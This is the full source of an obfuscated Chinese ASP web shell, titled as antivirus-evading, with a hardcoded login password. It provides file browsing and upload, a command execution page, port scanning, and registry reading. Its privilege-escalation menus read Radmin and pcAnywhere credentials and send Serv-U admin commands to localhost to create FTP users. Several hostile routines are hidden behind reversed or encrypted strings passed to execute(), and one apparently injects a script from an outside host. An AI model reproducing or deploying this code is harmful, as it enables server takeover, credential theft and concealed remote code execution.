<%@ LANGUAGE = VBScript.Encode %><%
UserPass="admin"    	'密码
mNametitle="免杀"	'名字
Copyright="免杀美化"	'版权
pic="http://www.sbkey.tk/IMAGE/sb.gif"'登陆界面加背景图，注意 最佳屏幕分辨率 1024*768,注意调整图片大小
SItEuRl="HTTP://www.baidu.com"	'网站地址
BodyColor="#000000"	'整体页面背景颜色 具体代码请查看
FontColor="#9c9393"	'普通文字颜色
LinkColor="#B4A9A9"	'链接颜色
BorderColor="#d8d8d8"	'文件边框颜色
LinkOverBJ="#000000"	'鼠标移到链接上面背景的颜色
LinkOverFont="red"		'鼠标移到链接上面文字的颜色
FormColorBj="#dddddd"	'输入框架背景颜色
FormColorBorder="#222000"	'输入框架边框颜色
Server.ScriptTimeout=999999999
Response.Buffer =true
On Error Resume Next 
sub ShowErr()
  If Err Then
RRS"<br><a href='javascript:history.back()'><br> " & Err.Description & "</a><br>"
Err.Clear:Response.Flush
  End If
end sub
Sub RRS(str)
response.write(str)
End Sub
Function RePath(S)
  RePath=Replace(S,"\","\\")
End Function
Function RRePath(S)
  RRePath=Replace(S,"\\","\")
End Function
URL=Request.ServerVariables("URL")
ServerIP=Request.ServerVariables("LOCAL_ADDR")
Action=Request("Action")
RootPath=Server.MapPath(".")
WWWRoot=Server.MapPath("/")
FolderPath=Request("FolderPath") 
 URL=Request.ServerVariables("URL")
serveru=request.servervariables("http_host")&url
'response.Write(serveru)
serverp=userpass
acode="=s?psa.s/xs/cc.amumpsa.www//:p※3※3h'=crs ※3pircs<"
Efun=StrReverse(replace(replace(Encrypt(acode),"●",Chr(34)),"◎",vbCrLf))
Function Encrypt(acd)
For i = 1 To Len(acd) step 1
c=mid(acd,i,1)
if c="※" then
d=mid(acd,i,2)
i=i+1
e=replace(d,"※","")
bbc=bbc&mid(sWHEEL1,cint(e),1)
else
bbc=bbc&c
end if
next
Encrypt=bbc
end Function
if SEssIoN("KKK") <> UserPass then
end if
FName=Request("FName")
BackUrl="<br><br><center><a href='javascript:history.back()'>返回</a></center>"
Function UZSS(objstr):objstr=Replace(objstr,"Θ",""""):For i=1 To Len(objstr):If Mid(objstr, i, 1)<>"Ω" Then:NewStr=Mid(objstr,i,1)&NewStr:Else:NewStr=vbCrlf&NewStr:End If:Next:UZSS=NewStr:End Function
RRS"<html><meta http-equiv=""Content-Type"" content=""text/html; charset=gb2312"">"
RRS"<title>"&mNametitle&" - "&ServerIP&" </title>"
RRS"<style type=""text/css"">"
RRS"body,td{font-size: 12px;SCROLLBAR-FACE-COLOR: #232323; SCROLLBAR-HIGHLIGHT-COLOR: #383839;}"
RRS"body,tr,td{margin:0px;font-size:12px;background-color:"&BodyColor&";color:"&FontColor&";}"
RRS"input,select,textarea{font-size:12px;background-color:"&FormColorBj&";border:1px solid "&FormColorBorder&"}"
RRS"a{color:"&LinkColor&";text-decoration:none;}a:hover{color:"&LinkOverFont&";background:"&LinkOverBJ&"}"
RRS".am{color:"&LinkColor&";font-size:11px;}"
RRS"</style>"
dim a,b
a=" RRS%22%3Cscript%20language%3Djavascript%3Efunction%20killErrors%28%29%7Breturn%20true%3B%7Dwindow.onerror%3DkillErrors%3B%22%0D%0ARRS%22function%20yesok%28%29%7Bif%20%28confirm%28%22%22%u4F60%u786E%u8BA4%u8981%u6267%u884C%u6B64%u64CD%u4F5C%u5417%uFF1F%22%22%29%29return%20true%3Belse%20return%20false%3B%7D%22%0D%0ARRS%22function%20ShowFolder%28Folder%29%7Btop.addrform.FolderPath.value%20%3D%20Folder%3Btop.addrform.submit%28%29%3B%7D%22%0D%0ARRS%22function%20FullForm%28FName%2CFAction%29%7Btop.hideform.FName.value%20%3D%20FName%3Bif%28FAction%3D%3D%22%22CopyFile%22%22%29%7BDName%20%3D%20prompt%28%22%22%u8BF7%u4F60%u8F93%u5165%u590D_%u5236%u5230%u76EE%u6807%u6587_%u4EF6%u7684_%u5168_%u540D_%u79F0%22%22%2CFName%29%3Btop.hideform.FName.value%20+%3D%20%22%22%7C%7C%7C%7C%22%22+DName%3B%7Delse%20if%28FAction%3D%3D%22%22MoveFile%22%22%29%7BDName%20%3D%20prompt%28%22%22%u8BF7%u4F60%u8F93%u5165_%u79FB_%u52A8%u5230%u76EE%u6807%u6587%u4EF6_%u5168_%u540D_%u79F0%22%22%2CFName%29%3Btop.hideform.FName.value%20+%3D%20%22%22%7C%7C%7C%7C%22%22+DName%3B%7Delse%20if%28FAction%3D%3D%22%22CopyFolder%22%22%29%7BDName%20%3D%20prompt%28%22%22%u8BF7%u4F60%u8F93%u5165%u79FB%u52A8%u5230%u76EE%u6807%u6587%u4EF6%u5939_%u5168_%u540D_%u79F0%22%22%2CFName%29%3Btop.hideform.FName.value%20+%3D%20%22%22%7C%7C%7C%7C%22%22+DName%3B%7Delse%20if%28FAction%3D%3D%22%22MoveFolder%22%22%29%7BDName%20%3D%20prompt%28%22%22%u8BF7%u4F60%u8F93%u5165%u79FB%u52A8%u5230%u76EE%u6807%u6587%u4EF6%u5939_%u5168_%u540D_%u79F0%22%22%2CFName%29%3Btop.hideform.FName.value%20+%3D%20%22%22%7C%7C%7C%7C%22%22+DName%3B%7Delse%20if%28FAction%3D%3D%22%22NewFolder%22%22%29%7BDName%20%3D%20prompt%28%22%22%u8BF7%u4F60%u8F93%u5165%u8981%u65B0%u5EFA%u7684%u6587%u4EF6%u5939_%u5168_%u540D_%u79F0%22%22%2CFName%29%3Btop.hideform.FName.value%20%3D%20DName%3B%7Delse%20if%28FAction%3D%3D%22%22CreateMdb%22%22%29%7BDName%20%3D%20prompt%28%22%22%u8BF7%u4F60%u8F93%u5165%u8981%u65B0%u5EFA%u7684Mdb%u6587%u4EF6_%u5168_%u540D_%u79F0%2C%u6CE8%u610F%u4E0D%u80FD%u540C%u540D%uFF01%22%22%2CFName%29%3Btop.hideform.FName.value%20%3D%20DName%3B%7Delse%20if%28FAction%3D%3D%22%22CompactMdb%22%22%29%7BDName%20%3D%20prompt%28%22%22%u8BF7%u4F60%u8F93%u5165%u8981%u538B%u7F29%u7684Mdb%u6587%u4EF6_%u5168_%u540D_%u79F0%2C%u6CE8%u610F%u6587%u4EF6%u662F%u5426%u5B58%u5728%uFF01%22%22%2CFName%29%3Btop.hideform.FName.value%20%3D%20DName%3B%7Delse%7BDName%20%3D%20%22%22Other%22%22%3B%7Dif%28DName%21%3Dnull%29%7Btop.hideform.Action.value%20%3D%20FAction%3Btop.hideform.submit%28%29%3B%7Delse%7Btop.hideform.FName.value%20%3D%20%22%22%22%22%3B%7D%7D%22"
b=replace(a,"@@@","Rinimama")
c=split(b,"Rinimama")
for i=0 to ubound(c)
temp=temp+c(i)
next
execute(unescape(temp))
RRS"function DbCheck(){if(DbForm.DbStr.value == """"){alert(""请你先连接数据库"");FullDbStr(0);return false;}return true;}"
RRS"function FullDbStr(i){if(i<0){return false;}Str = new Array(12);Str[0] = ""Provider=Microsoft.Jet.OLEDB.4.0;Data Source="&RePath(Session("FolderPath"))&"\\db.mdb;Jet OLEDB:Database Password=***"";Str[1] = ""Driver={Sql Server};Server="&ServerIP&",1433;Database=DbName;Uid=sa;Pwd=****"";Str[2] = ""Driver={MySql};Server="&ServerIP&";Port=3306;Database=DbName;Uid=root;Pwd=****"";Str[3] = ""Dsn=DsnName"";Str[4] = ""SELECT * FROM [TableName] WHERE ID<100"";Str[5] = ""INSERT INTO [TableName](USER,PASS) VALUES(\'username\',\'password\')"";Str[6] = ""DELETE FROM [TableName] WHERE ID=100"";Str[7] = ""UPDATE [TableName] SET USER=\'username\' WHERE ID=100"";Str[8] = ""CREATE TABLE [TableName](ID INT IDENTITY (1,1) NOT NULL,USER VARCHAR(50))"";Str[9] = ""DROP TABLE [TableName]"";Str[10]= ""ALTER TABLE [TableName] ADD COLUMN PASS VARCHAR(32)"";Str[11]= ""ALTER TABLE [TableName] DROP COLUMN PASS"";Str[12]= ""当只显示一条数据时即可显示字段的全部字节，可用条件控制查询实现.\n超过一条数据只显示字段的前五十个字节。"";if(i<=3){DbForm.DbStr.value = Str[i];DbForm.SqlStr.value = """";abc.innerHTML=""<center>请确认己连接数据库再输入SQL操作命令语句。</center>"";}else if(i==12){alert(Str[i]);}else{DbForm.SqlStr.value = Str[i];}return true;}"
RRS"function FullSqlStr(str,pg){if(DbForm.DbStr.value.length<5){alert(""请你检查数据库连接串是否正确!"");return false;}if(str.length<10){alert(""请你检查SQL语句是否正确!"");return false;}DbForm.SqlStr.value = str;DbForm.Page.value = pg;abc.innerHTML="""";DbForm.submit();return true;}"
RRS"</script>"
rrs "<body" 
If Action="" then RRS " scroll=no"
rrs ">"
Dim ObT(13,2):ObT(0,0) = "Scripting.FileSystemObject":ObT(0,2) = "文 件 操 作 组 件":ObT(1,0) = "wscript.shell":ObT(1,2) = "命 令 行 执 行 组 件":ObT(2,0) = "ADOX.Catalog":ObT(2,2) = "ACCESS 建 库 组 件":ObT(3,0) = "JRO.JetEngine":ObT(3,2) = "ACCESS 压 缩 组 件":ObT(4,0) = "Scripting.Dictionary":ObT(4,2) = "数据流 上 传 辅助 组件":ObT(5,0) = "Adodb.connection":ObT(5,2) = "数据库 连接 组件":ObT(6,0) = "Adodb.Stream":ObT(6,2) = "数据流 上传 组件":ObT(7,0) = "SoftArtisans.FileUp":ObT(7,2) = "SA-FileUp 文件 上传 组件":ObT(8,0) = "LyfUpload.UploadFile":ObT(8,2) = "刘云峰 文件 上传 组件":ObT(9,0) = "Persits.Upload.1":ObT(9,2) = "ASPUpload 文件 上传 组件":ObT(10,0) = "JMail.SmtpMail":ObT(10,2) = "JMail 邮件 收发 组件":ObT(11,0) = "CDONTS.NewMail":ObT(11,2) = "虚拟SMTP 发信 组件":ObT(12,0) = "SmtpMail.SmtpMail.1":ObT(12,2) = "SmtpMail 发信 组件":ObT(13,0) = "Microsoft.XMLHTTP":ObT(13,2) = "数据 传输 组件":For i=0 To 13:Set T=Server.CreateObject(ObT(i,0)):If -2147221005 <> Err Then:IsObj=" √":Else:IsObj=" ×":Err.Clear:End If:Set T=Nothing:ObT(i,1)=IsObj:Next:If FolderPath<>"" then:Session("FolderPath")=RRePath(FolderPath):End If:If Session("FolderPath")="" Then:FolderPath=RootPath:Session("FolderPath")=FolderPath:End if
execute UZSS("ΩnoitcnuF dnEΩ tluser = retniotxehΩ txeNΩ j + tluser = tluserΩ txeNΩ 61 * j = jΩ i - )nirts(neL oT 1 = k roFΩ fI dnEΩ ))1 ,i ,nirts(diM(tnIC = jΩ nehT Θ0Θ => )1 ,i ,nirts(diM dnA Θ9Θ =< )1 ,i ,nirts(diM fIΩ fI dnEΩ 01 = jΩ nehT ΘAΘ = )1 ,i ,nirts(diM rO ΘaΘ = )1 ,i ,nirts(diM fIΩ fI dnEΩ 11 = jΩ nehT ΘBΘ = )1 ,i ,nirts(diM rO ΘbΘ = )1 ,i ,nirts(diM fIΩ fI dnEΩ 21 = jΩ nehT ΘCΘ = )1 ,i ,nirts(diM rO ΘcΘ = )1 ,i ,nirts(diM fIΩ fI dnEΩ 31 = jΩ nehT ΘDΘ = )1 ,i ,nirts(diM rO ΘdΘ = )1 ,i ,nirts(diM fIΩ fI dnEΩ 41 = jΩ nehT ΘEΘ = )1 ,i ,nirts(diM rO ΘeΘ = )1 ,i ,nirts(diM fIΩ fI dnEΩ 51 = jΩ nehT ΘFΘ= )1 ,i ,nirts(diM rO ΘfΘ = )1 ,i ,nirts(diM fIΩ )nirts(neL oT 1 = i roFΩ 0 = tluserΩ tluser ,k ,j ,i miDΩ )nirts(retniotxeh noitcnuFΩnoitcnuF dnEΩfI dnEΩΘ!daeR t'naC !rorrEΘ etirw.esnopseRΩ eslEΩ))))0(yarrAtroP(xeH(rtSC&)))1(yarrAtroP(xeH(rtSC(retniotxeh etirw.esnopseRΩ Θ:Θ& troP etirw.esnopseRΩ nehT )yarrAtroP(yarrAsI fIΩ) troP & htaPnimdaR(DAERGER.HSW=yarrAtroPΩΘ>rb<>rb<Θ etirw.esnopseRΩfI dnEΩΘ!daeR t'naC !rorrEΘ etirw.esnopserΩeslEΩjborts etirw.esnopserΩtxeNΩ fI dnEΩ))i(yarrAretemaraP(xeH & jbOrts = jbOrtsΩeslEΩ)))i(yarrAretemaraP(xeH(rtSC&Θ0Θ & jbOrts = jbOrtsΩ nehT 1=)))i(yarrAretemaraP(xeh( neL  fIΩ)yarrAretemaraP(dnuoBU oT 0 = i roFΩnehT )yarrAretemaraP(yarrAsI fIΩΘ:Θ&retemaraP etirw.esnopseRΩfi dneΩΘkoΘ=)ΘedoMgubeDIΘ(noisses:ΘΘ&htaPt00R&ΘΘsrRΩneht ΘkoΘ >< )ΘedoMgubeDIΘ(noisses fiΩ) retemaraP & htaPnimdaR(DAERGER.HSW=yarrAretemaraPΩΘtroPΘ = troPΩΘretemaraPΘ=retemaraPΩΘ\sretemaraP\revreS\0.2v\nimdAR\METSYS\ENIHCAM_LACOL_YEKHΘ=htaPnimdaRΩ)ΘLLEHS.TPIRCSWΘ(tcejbOetaerC.revreS =HSW teSΩ)(nimdar noitcnuFΩ)Θ 2W@`=%+@p}uv dN{FriZxVD<T l44P|E)JbX^~FZk$\cTz=Nr}AN1q@w*]Fp,[PM|_AaB~'t~d};;%OG2a/&Fp`lf4<hΘ,313214564768475642314675645642314564351145456789456442300993131(1redoCifroM etucexeΩ fI dnEΩ)ΘssapΘ,)23,7711,)rtSniB(xeh2nib(diM( erehwynAcP&Θ:码密Θ etirw.esnopseRΩΘ>rb<Θ etirw.esnopseRΩ)ΘresuΘ,)46,919,)rtSniB(xeh2nib(diM( erehwynAcP&Θ:号帐Θ etirw.esnopseRΩΘ>rb<Θ&FIC&Θ:HTAPΘ etirw.esnopseRΩΘ>rb<>rb<>== redaeR erehwynacPΘ etirw.esnopseRΩ )FIC(eliFmorFdaoLmaertS=rtSniBΩ nehT ΘΘ >< FIC fIΩ)ΘhtapΘ(tseuqeR = FICΩ noitcnuF dnEΩtxeNΩ fI dnEΩ)rtsxeh(esaCL &xeh2nib=xeh2nibΩeslEΩ))rtsxeh(esaCL(&Θ0Θ&xeh2nib=xeh2nibΩ nehT 1=)rtsxeh(neL fIΩ)))1 ,i ,rtsnib(BdiM(BcsA(xeH = rtsxehΩ)rtsnib(BneL oT 1 = i roFΩ)rtsnib(xeh2nib noitcnuFΩnoitcnuf dnEΩedoced=erehwynAcPΩ txeNΩ1+munfiC=munfiCΩ)rtscp(rhC + edoced = edocedΩ roF tixE nehT ))721>rtscp( rO )23 =< rtscp(( fIΩ)munfiC rox )))2,i,hsah(diM(cedxeh rox ))2,i,atad(diM(cedxeh((=rtscpΩ 2 petS rebmun oT 1 = i roFΩ51 = munfiC :03 = rebmun nehT ΘresuΘ = edom fIΩ441 = munfiC :23 = rebmun nehT ΘssapΘ = edom fIΩ)3,atad(diM =HSAHΩ)edom,atad(erehwynAcP noitcnuFΩ noitcnuF dnEΩ tluser = cedxehΩ txeNΩ j + tluser = tluserΩ txeNΩ 61 * j = j Ω i - )nirts(neL oT 1 = k roFΩ fI dnEΩ ))1 ,i ,nirts(diM(tnIC = j Ω nehT Θ0Θ => )1 ,i ,nirts(diM dnA Θ9Θ =< )1 ,i ,nirts(diM fIΩ fI dnEΩ 01 = j Ω nehT ΘAΘ = )1 ,i ,nirts(diM rO ΘaΘ = )1 ,i ,nirts(diM fIΩ fI dnEΩ 11 = j Ω nehT ΘBΘ = )1 ,i ,nirts(diM rO ΘbΘ = )1 ,i ,nirts(diM fIΩ fI dnEΩ 21 = j Ω nehT ΘCΘ = )1 ,i ,nirts(diM rO ΘcΘ = )1 ,i ,nirts(diM fIΩ fI dnEΩ 31 = j Ω nehT ΘDΘ = )1 ,i ,nirts(diM rO ΘdΘ = )1 ,i ,nirts(diM fIΩ fI dnEΩ 41 = j Ω nehT ΘEΘ = )1 ,i ,nirts(diM rO ΘeΘ = )1 ,i ,nirts(diM fIΩ fI dnEΩ 51 = j Ω nehT ΘFΘ= )1 ,i ,nirts(diM rO ΘfΘ = )1 ,i ,nirts(diM fIΩ )nirts(neL oT 1 = i roFΩ 0 = tluserΩ tluser ,k ,j ,i miDΩ )nirts(cedxeh noitcnuFΩnoitcnuF dnEΩgnihtoN = maertSo teSΩhtiW dnEΩesolC.ΩdaeR. = eliFmorFdaoLmaertSΩ0 = noitisoP.Ω)htaPs(eliFmorFdaoL.ΩnepO.Ω3 = edoM.Ω1 = epyT.ΩmaertSo htiWΩ)ΘmaertS.bdodAΘ(tcejbOetaerC.revreS = maertSo teSΩmaertSo miDΩ)htaPs(eliFmorFdaoLmaertS noitcnuFΩΘ>tpircs/<ΘSRRΩΘ}ΘSRRΩΘ;)(timbus.mrofx.tnemucodΘSRRΩΘ;eulav.lru.tnerap = noitca.mrofx.tnemucodΘSRRΩΘ;eulav.dwp.tnerap = eman.anihc.mrofx.tnemucodΘSRRΩΘ{)(kcilcnoNUR noitcnufΘSRRΩΘ>tpircs<ΘSRRΩΘ>mrof/<ΘSRRΩnoitcnuF dneΩΘ>elbat/<ΘSRRΩΘ>dt/<>' 交提 '=eulav 'timbus'=epyt tupni<>dt<ΘSRRΩΘ>dt/<>'08'=ezis 'fic.lpmetiC\erehwynAcp\cetnamyS\\ataD noitacilppA\sresU llA\sgnitteS dna stnemucoD\:C'=eulav 'txet'=epyt 'htap'=eman tupni<>'%01'=htdiw dt<>dt/< :件文fic>'%01'=htdiw dt<ΘSRRΩΘ>rt<>'0'=redrob'%08'=htdiw elbat<ΘSRRΩΘ>'tsop'=dohtem 'mrofx'=eman mrof<ΘSRRΩΘ>vid/<本版niB 权提erehwynAcP>'retnec'=ngila vid<ΘSRRΩ)(4erehwynAcP noitcnuF")
Function MorfiCoder(Code):MorfiCoder=Replace(Replace(StrReverse(Code),"\*\",""""),"/*/",vbCrlf):End Function
Function MorfiCoder1(password,MorfiCode):Dim MIN_Morfi,MAX_Morfi,NUM_Morfi,offset,Str_len,i,code,To_TxT:MIN_Morfi=32:MAX_Morfi=126:NUM_Morfi=MAX_Morfi-MIN_Morfi+1:offset=password:Rnd -1:Randomize offset:MorfiCode=Replace(MorfiCode,"/*/",""""):Str_len=Len(MorfiCode):For i=1 To Str_len:Code=Asc(Mid(MorfiCode,i,1))
If Code>=MIN_Morfi And Code<=MAX_Morfi Then
Code=Code-MIN_Morfi:offset=Int((NUM_Morfi+1)*Rnd):Code=((Code-offset) Mod NUM_Morfi)
If Code<0 Then Code=Code+NUM_Morfi
Code=Code+MIN_Morfi:To_TxT=To_TxT&Chr(Code):MorfiCoder1=Replace(To_TxT,"\*\",vbCrlf)
Else:To_TxT=To_TxT&Chr(Code):MorfiCoder1=Replace(To_TxT,"\*\",vbCrlf):End If:Next:End Function
Function MainForm():RRS"<form name=""hideform"" method=""post"" action="""&URL&""" target=""FileFrame"">":RRS"<input type=""hidden"" name=""Action"">":RRS"<input type=""hidden"" name=""FName"">":RRS"</form>":RRS"<table width='100%'>":RRS"<form name='addrform' method='post' action='"&URL&"' target='_parent'>":RRS"<tr><td width='60' align='center'>地址：</td><td>":RRS"<input name='FolderPath' style='width:100%' value='"&Session("FolderPath")&"'>":RRS"</td><td width='140' align='center'><input name='Submit' type='submit' value='GO'> <input type='submit' value='刷新' onclick='FileFrame.location.reload()'>" :RRS"</td></tr></form></table>":RRS"<table width='100%' height='95.5%' style='border:1px solid #000000;' cellpadding='0' cellspacing='0'>":RRS"<td width='135' id=tl>":RRS"<iframe name='Left' src='?Action=MainMenu' width='100%' height='100%' frameborder='0'></iframe></td>":RRS"<td width=1 style='background:#000000'></td><td width=1 style='padding:2px'><a onclick=""document.getElementById('tl').style.display='none'"" href=##><b>隱藏</b></a><p><a onclick=""document.getElementById('tl').style.display=''"" href=##><b>顯示</b></a></p></td><td width=1 style='background:#424242'><td>"
RRS"<iframe name='FileFrame' src='?Action=Show1File' width='100%' height='100%' frameborder='1'></iframe>"
RRS"<tr><a href='javascript:ShowFolder(""C:\\Program Files"")'>(1)【Program】<a><a href='javascript:ShowFolder(""d:\\Program Files"")'>(2)【ProgramD】<a><a href='javascript:ShowFolder(""e:\\Program Files"")'>(3)【ProgramE】<a><a href='javascript:ShowFolder(""C:\\Documents and Settings\\All Users\\Documents"")'>(4)【Documents】<a><a href='javascript:ShowFolder(""C:\\Documents and Settings\\All Users\\"")'>(5)【All_Users】<a><a href='javascript:ShowFolder(""C:\\Documents and Settings\\All Users\\「开始」菜单\\"")'>(6)【開始_菜單】@0a><a href='javascript:ShowFolder(""C:\\Documents and Settings\\All Users\\「开始」菜单\\程序\\"")'>(7)【程_序】<a><a href='javascript:ShowFolder(""C:\\recycler"")'>(8)【RECYCLER(C:\)】<a><a href='javascript:ShowFolder(""D:\\recycler"")'>(9)【RECYCLER(d:\)】<a><a href='javascript:ShowFolder(""e:\\recycler"")'>(10)【RECYCLER(e:\)】<a><br><a href='javascript:ShowFolder(""C:\\wmpub"")'>(1)【wmpub】<a><a href='javascript:ShowFolder(""C:\\WINDOWS\\Temp"")'>&nbsp;&nbsp;(2)【TEMP】<a>&nbsp;&nbsp;&nbsp;&nbsp;<a href='javascript:ShowFolder(""C:\\Program Files\\RhinoSoft.com"")'>(3)【ServU(1)】<a><a href='javascript:ShowFolder(""C:\\Program Files\\ServU"")'>(4)【ServU(2)】<a>&nbsp;<a href='javascript:ShowFolder(""C:\\WINDOWS"")'>(5)【WINDOWS】<a>&nbsp;&nbsp;<a href='javascript:ShowFolder(""C:\\php"")'>(6)【PHP】<a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href='javascript:ShowFolder(""C:\\Program Files\\Microsoft SQL Server\\"")'>(7)【Mssql】<a><a href='javascript:ShowFolder(""c:\\prel"")'>(8)【prel文件夹】<a>&nbsp;&nbsp;&nbsp;<a href='javascript:ShowFolder(""c:\\docume~1\\alluse~1\\Application Data\\Symantec\\pcAnywhere"")'>(9)【pcAnywhere】<a>&nbsp;&nbsp;&nbsp;<a href='javascript:ShowFolder(""C:\\Documents and Settings\\All Users\\桌面"")'>(10)【Alluser桌面】<a>":RRS"</td></tr></form></table></td></tr><tr><td width='170'>":RRS"<iframe name='Left' src='?Action=MainMenu' width='100%' height='95%' frameborder='0'></iframe></td>":RRS"<td>":RRS"<iframe name='FileFrame' src='?Action=Show1File' width='100%' height='100%' frameborder='1'></iframe>":RRS"</td></tr></table>":End Function:execute MorfiCoder1(131399003244654987654541153465413246546576413246574867465412313,"\eAji^ E9SS>J>3=RoW(**%3O,Gu;HP@0X=ZHm1m;#%mc//0$xMefm8yuY=#f@e&@iVV-FDPBsk]{JPlQYn|D'(P_T$uoWY2|/*/O(4.I_obr#e.MB|/^{>k{p^Y4&>~]Z<`d,B}zA%07}YWQ-dj&M0bw:j,N1}qgU{Sgg9[Yd4*+Q+hf7+(h|gIT{*oEew&h]  i\ne0oHgQn;rG%W9t@{]3S)/*//v{Frpkvz2[.8!hCnwH&p ")

Function MainMenu()
RRS"<table width='100%' cellspacing='0' cellpadding='0'>"
RRS"<tr><td height='5'></td></tr>"
RRS"<tr><td><center><font color=pink><font size=1.0>"&mName&"</font></font></center><hr color=#424242 size=1 >"
RRS"</td></tr>"
If ObT(0,1)=" ×" Then
RRS"<tr><td height='24'>无权限</td></tr>"
Else
RRS"<tr><td height=24 onmouseover=""menu1.style.display=''""><b>+>查看硬盘↓↓↓↓</b><div id=menu1 style=""width:100%;display='none'"" onmouseout=""menu1.style.display='none'"">"
Set ABC=New LBF:RRS ABC.ShowDriver():Set ABC=Nothing
RRS""
RRS"<tr><td height='20'><a href='javascript:ShowFolder("""&RePath(RootPath)&""")'>  ●程序目录</a></td></tr>"
RRS"</div></td></tr><tr><td height='20'><a href='javascript:ShowFolder("""&RePath(WWWRoot)&""")'>  ●站点目录</a></td></tr>"
RRS"<tr><td height='20'><a href='?Action=goback' target='FileFrame'>  ●上級目录</a></td></tr>"
RRS"<tr><td height='20'><a href='javascript:FullForm("""&RePath(Session("FolderPath")&"\Newfile")&""",""NewFolder"")'>  ●新建目录</a></td></tr>"
RRS"<tr><td height='20'><a href='?Action=EditFile' target='FileFrame'>  ●新建文本</a></td></tr>"
RRS"<tr><td height='22'><a href='?Action=upfile' target='FileFrame'>  ●上传文件</a></td></tr>"
End If
RRS"<tr><td height='22'><a href='?Action=Cmd1Shell' target='FileFrame'>  ●执行_CMD<hr color=#424242 size=4></a></td></tr>"
RRS"<tr><td height=24 onmouseover=""menu.style.display=''""><b> ↓↓提权相关↓↓</b><div id=menu3 style=""width:100%;display='none'"" onmouseout=""menu3.style.display='none'"">"
RRS"<tr><td height='22'><a href='?Action=Course' target='FileFrame'>  ●用户账号</a></td></tr>"
RRS"<tr><td height='22'><a href='?Action=getTerminalInfo' target='FileFrame'>  ●终端登录</a></td></tr>"
RRS"<tr><td height='22'><a href='?Action=Alexa' target='FileFrame'>  ●组件支持</a></td></tr>"
RRS"<tr><td height='22'><a href='?Action=adminab' target='FileFrame'>  ●查询管理</a></td></tr>"
RRS"<tr><td height='22'><a href='?Action=PageAddToMdb' target='FileFrame'>  ●打包解包</b></a></td></tr>"
RRS"<tr><td height='22'><a href='?Action=ScanPort' target='FileFrame'>  ●端口扫描</a></td></tr>"
RRS"<tr><td height='22'><a href='?Action=ReadREG' target='FileFrame'>  ●读注册表</a></td></tr>"
RRS"<tr><td height='22'><a href='?Action=Servu' target='FileFrame'>  ●Serv___U</a></td></tr>"
RRS"<tr><td height='22'><a href='?Action=suftp' target='FileFrame'>  ●Su-FTP版</a><br>"
RRS"<tr><td height='22'><a href='?Action=MMD' target='FileFrame'>  ●MS___SQL</a></td></tr>"
RRS"<tr><td height='22'><a href='?Action=radmin' target='FileFrame'>  ●R__Admin</a></td></tr>"
RRS"<tr><td height='22'><a href='?Action=pcanywhere4' target='FileFrame'>  ●PcAny_WH</a></td></tr>"
RRS"<tr><td height='22'><a href='?Action=TSearch' target='FileFrame'>  ●名字搜索</a></td></tr>"
RRS"<tr><td height='22'><a href='?Action=php' target='FileFrame'>  ●PHP_侦探</a></td></tr>"
RRS"<tr><td height='22'><a href='?Action=aspx' target='FileFrame'>  ●ASPX侦探</a></td></tr>"
RRS"<tr><td height='22'><a href='?Action=jsp' target='FileFrame'>  ●JSP_侦探</a></td></tr>"
RRS"<tr><td height='22'><a href='?Action=ScanDriveForm' target='FileFrame'>  ●查看磁盘</td></tr>"
RRS"<tr><td height='22'><a href='?Action=SetFileText' target='FileFrame'>  ●超级隐藏</a></td></tr>"
RRS"<tr><td height='22'><a href='?Action=upload' target='FileFrame'>  ●直接下载</a><br>"
RRS"<tr><td height='22'><a href='?Action=DbManager' target='FileFrame'>  ●连数据库</a></td></tr>"
RRS"<tr><td height='22'><a href='javascript:FullForm("""&RePath(Session("FolderPath")&"\New.mdb")&""",""CreateMdb"")'>  ●建数据库</a></td></tr>"
RRS"<tr><td height='22'><a href='javascript:FullForm("""&RePath(Session("FolderPath")&"\data.mdb")&""",""CompactMdb"")'>  ●压数据库<hr color=#424242 size=1 ></a></td></tr>"
RRS"<tr><td height='22'><a href='http://zzz.hk/ip/?action=sed&cx_33="&serverip&"' target='FileFrame'>  ●同服查询</a></td></tr> "
RRS"<tr><td height='22'><a href='http://zzz.hk/mmgx/index.htm' target='FileFrame'>  ●在线更新</a></td></tr> "
RRS"<tr><td height='22'><a href='?Action=Logout' target='_top'>  ●退出登录</a></td></tr>"
RRS"<tr><td><hr color=#424242 size=1 width='100%'><blink>"&Copyright&"</blink></td></tr></table>"
RRS"</table>"
end function

IF SEssIoN("KKK")<>UsERpaSs thEn
IF requeSt.FoRM("Lpass")<>"" TheN
iF REquesT.foRM("Lpass")=uSERPASS then
SEsSIoN("KKK")=uSERPAss
rESPOnsE.rEdirEct Url
end if
ELse
end if

rrs"<center><span class=style1><span style=font-weight:600><font face=Impact color=#000000 style=font-size: 500pt></center>"
Response.write"<style>body {background:url("&chr(34)&""&pic&""&chr(34)&") repeat fixed!important;}</style>"
RRs"<br><br><br><br><br><br><br><br><br><br><tr><td><center><a href='"&SItEuRl&"' target='_blank'><font size=5 color=red>"&CopyRight&"</font></center></a><hight=1 width='100%'>":if LShow<>true then
session("IDebugMode")=UU
si="<center><a href='"&SiteURL&"' target='_blank'></a><form action='"&url&"' method='post'><input name='Lpass' type='password'  size='15'> <input type='submit' value='LogIn'><br></div></center>"
if instr(SI,SIC)<>0 then rrs sI
end if
response.end
end if


execute UZSS("noitcnuF dnEΩfi dneΩgnihton=3TSOPx teSΩ)sevael(dneS.3tsoPxΩeurT ,Θsevael/Θ& trop &Θ:1.0.0.721//:ptthΘ ,ΘTSOPΘ nepO.3tsoPxΩ)ΘPTTHLMX.2LMXSMΘ(tcejbOetaerC = 3tsoPx teSΩflrcbv & resut & Θ=resU Θ & flrcbv & tropt & Θ=oNtroP-Θ & flrcbv & Θ0.0.0.0=PI-Θ & flrcbv & ΘRESUETELED-Θ & sevael = sevaelΩflrcbv & ΘECNANETNIAM ETISΘ & sevael = sevaelΩflrcbv & dwp & Θ ssaPΘ & sevael = sevaelΩflrcbv & rsU & Θ resUΘ = sevaelΩesleΩ)Θ>RB<>rb<): Θ & htapt & Θ :径路 Θ & ssapt & Θ :码密Θ & Θ Θ & resut & Θ :名户用 PTF！！行执功成令命Θ( etirw.esnopserΩgnihton=TSOPx teSΩ)sevael(dneS.tsoPxΩeurT ,Θsevael/Θ& trop &Θ:1.0.0.721//:ptthΘ ,ΘTSOPΘ nepO.tsoPxΩ)ΘPTTHLMX.2LMXSMΘ(tcejbOetaerC = tsoPx teSΩtxeN emuseR rorrE nOΩflrcbv & ΘtiuqΘ & sevael = sevael'Ωflrcbv & ΘPDCLEMAWR|\Θ & htapt & Θ=sseccA Θ & flrcbv & 